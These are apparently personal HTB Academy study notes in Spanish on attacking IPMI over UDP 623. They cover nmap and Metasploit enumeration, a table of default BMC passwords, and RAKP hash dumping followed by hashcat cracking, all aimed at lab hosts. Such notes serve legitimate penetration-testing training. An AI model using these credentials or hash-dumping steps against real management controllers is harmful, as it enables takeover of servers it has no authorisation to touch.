# 623 UDP (IPMI)

## IPMI

> **TIP** La **Interfaz de Gestión Inteligente de Plataformas (IPMI)** es un conjunto de especificaciones estandarizadas para sistemas de gestión de host basados en hardware. Se utiliza para la administración y monitorización de sistemas, actuando como un subsistema autónomo que opera independientemente de la BIOS, la CPU, el firmware y el sistema operativo del host.

> **NOTE** IPMI permite a los administradores gestionar y monitorizar sistemas incluso si están apagados o no responden, sin necesidad de acceso al sistema operativo. Se emplea típicamente:
>
> * Antes del arranque del sistema operativo para modificar configuraciones del BIOS.
> * Cuando el host está completamente apagado.
> * Para acceder al host tras una caída del sistema.
>
> Componentes requeridos para su funcionamiento:
>
> * **BMC (Baseboard Management Controller)**: microcontrolador esencial en IPMI.
> * **ICMB (Intelligent Chassis Management Bus)**: interfaz de comunicación entre chasis.
> * **IPMB (Intelligent Platform Management Bus)**: extensión del BMC.
> * **Memoria IPMI**: almacena eventos del sistema y otros datos.
> * **Interfaces de comunicación**: sistema local, serial, LAN, ICMB y PCI.

***

### Enumeración

> **QUOTE** IPMI se comunica mediante el puerto **UDP 623**. Los sistemas IPMI están representados por los **BMC**, usualmente sistemas ARM embebidos con Linux, conectados directamente a la placa base del host. Pueden estar integrados o añadirse mediante tarjetas PCI.

> **DANGER** Los BMC más comunes en pruebas de penetración son **HP iLO**, **Dell DRAC** y **Supermicro IPMI**. Obtener acceso a un BMC equivale prácticamente a acceso físico total al sistema: reinicio, apagado o reinstalación del SO. Estos BMC ofrecen consola web, protocolos como Telnet/SSH y acceso por UDP 623.

```bash
# Enumeración con Nmap
sudo nmap -sU --script ipmi-version -p 623 ilo.inlanfreight.local

# Escaneo de versiones con Metasploit
use auxiliary/scanner/ipmi/ipmi_version
set rhosts 10.129.42.195
show options
run
```

| Producto        | Usuario       | Contraseña                                                     |
| --------------- | ------------- | -------------------------------------------------------------- |
| Dell iDRAC      | root          | calvin                                                         |
| HP iLO          | Administrator | Cadena aleatoria de 8 caracteres (números y letras mayúsculas) |
| Supermicro IPMI | ADMIN         | ADMIN                                                          |

***

### Configuraciones peligrosas

> **INFO** Si las credenciales por defecto fallan, se puede explotar una vulnerabilidad del protocolo **RAKP** en IPMI 2.0. Durante la autenticación, el servidor envía un hash SHA1/MD5 con sal de la contraseña **antes de autenticar al cliente**.

```bash
# Ataque con hashcat
hashcat -m 7300 ipmi.txt -a 3 ?1?1?1?1?1?1?1?1 -1 ?d?u,

# Extracción de hashes con Metasploit
use auxiliary/scanner/ipmi/ipmi_dumphashes
set rhosts 10.129.42.195
show options
run
```

> **BUG** Si Metasploit no recupera la contraseña, puedes configurar un diccionario como **rockyou.txt** dentro del propio Metasploit para forzar el crédito.

***

### Redes sociales

* LinkedIn: [https://www.linkedin.com/in/tuch0/](https://www.linkedin.com/in/tuch0/)
* Instagram: [https://www.instagram.com/tuch0\_/](https://www.instagram.com/tuch0_/)
* YouTube: [https://www.youtube.com/@tuch0](https://www.youtube.com/@tuch0)\_
* GitHub: [https://github.com/Tuch0](https://github.com/Tuch0)
* Web personal: [https://tuch0.com/](https://tuch0.com/)

> 📄 Apuntes personales de HTB Academy. Para uso educativo.
